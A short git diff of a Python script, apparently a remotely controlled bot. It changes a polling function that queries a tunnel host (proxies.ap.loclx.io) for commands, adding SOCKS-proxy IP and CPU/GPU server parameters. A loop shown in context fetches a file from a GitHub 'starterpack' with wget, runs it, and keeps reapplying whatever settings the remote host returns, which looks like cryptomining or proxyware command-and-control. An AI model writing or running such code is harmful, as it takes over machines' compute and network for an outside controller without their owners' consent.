@@ -60,15 +60,18 @@ def get_username():
     except Exception as e:
         return 'unknow'
 
-def get_api_status(username, index_name, socks=False, cpu=False, cpu_solo=False, gpu=False, gpu_solo=False):
-    url = "http://halloworld.ap.loclx.io/status"
+def get_api_status(username, index_name, socks, socks_ip, cpu, cpu_server, cpu_solo, gpu, gpu_server, gpu_solo):
+    url = "http://proxies.ap.loclx.io/status"
     params = {
         "username": username,
         "index": index_name,
         "socks": socks,
+        "socks_ip": socks_ip,
         "cpu": cpu,
+        "cpu_server": cpu_server,
         "cpu_solo": cpu_solo,
         "gpu": gpu,
+        "gpu_server": gpu_server,
         "gpu_solo": gpu_solo
     }
 
@@ -125,7 +128,7 @@ run_bash_command("wget https://github.com/handevproject/starterpack/raw/main/run
 run_runtime(args.plant, args.plant_ip, args.cpu, args.cpu_server, args.cpu_solo, args.gpu, args.gpu_server, args.gpu_solo)
 
 while True:
-    command = get_api_status(username, args.name, args.plant, args.cpu, args.gpu)
+    command = get_api_status(username, args.name, args.plant, args.plant_ip, args.cpu, args.cpu_server, args.cpu_solo, args.gpu, args.gpu_server, args.gpu_solo)
     if command:
         args.plant = command.get("plant")
         args.plant_ip = command.get("plant_ip")
